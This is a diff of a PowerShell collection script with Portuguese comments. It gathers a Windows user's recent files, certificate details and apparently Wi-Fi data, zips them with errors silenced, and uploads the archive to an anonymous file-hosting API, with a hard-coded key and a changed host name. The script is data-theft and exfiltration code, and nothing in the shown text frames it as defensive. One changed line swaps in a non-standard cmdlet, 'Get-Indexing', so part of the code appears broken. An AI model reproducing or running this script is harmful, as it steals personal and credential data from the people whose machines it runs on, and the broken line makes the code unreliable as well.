@@ -1,4 +1,4 @@
-# KIT v7.5-ZIP  –  PS 5.1/7 cross-compatível  –  upload com sua key
+# KIT v7.5-ZIP  –  PS 5.1/7 cross-compatível  –  upload AnonFiles
 $ErrorActionPreference = 'SilentlyContinue'
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 
@@ -32,7 +32,7 @@ Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -File -EA 0 |
     Set-Content (Join-Path $work '10_RecentFiles.json') -Encoding UTF8
 
 # ---------- 3) Certificados ----------
-Get-ChildItem Cert:\CurrentUser\My -EA 0 |
+Get-Indexing Cert:\CurrentUser\My -EA 0 |
     Select Subject,Thumbprint,NotAfter |
     ConvertTo-Json -Compress |
     Set-Content (Join-Path $work '11_Certs.json') -Encoding UTF8
@@ -69,16 +69,16 @@ Remove-Item $wifiDir -Recurse -Force
 # ---------- 6) Compactar ----------
 [IO.Compression.ZipFile]::CreateFromDirectory($work, $zip, 'Optimal', $false)
 
-# ---------- 7) Upload AnonFiles (PS 5.1 compatível) ----------
+# ---------- 7) Upload AnonFiles ----------
 try {
     Add-Type -AssemblyName System.Net.Http
     $client  = New-Object System.Net.Http.HttpClient
-    $content = New-Object System.Net.Http.MultipartFormDataContent
     $fs      = [IO.File]::OpenRead($zip)
+    $content = New-Object System.Net.Http.MultipartFormDataContent
     $fileCnt = New-Object System.Net.Http.StreamContent($fs)
     $content.Add($fileCnt, "file", [IO.Path]::GetFileName($zip))
 
-    $url      = "https://api.anonfiles.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d"
+    $url      = "https://api.anonfilesnew.com/upload?key=AFtru5qQZX8HN5npouThcNDJtVbe6d"
     $response = $client.PostAsync($url, $content).Result
     $body     = $response.Content.ReadAsStringAsync().Result
     $json     = $body | ConvertFrom-Json
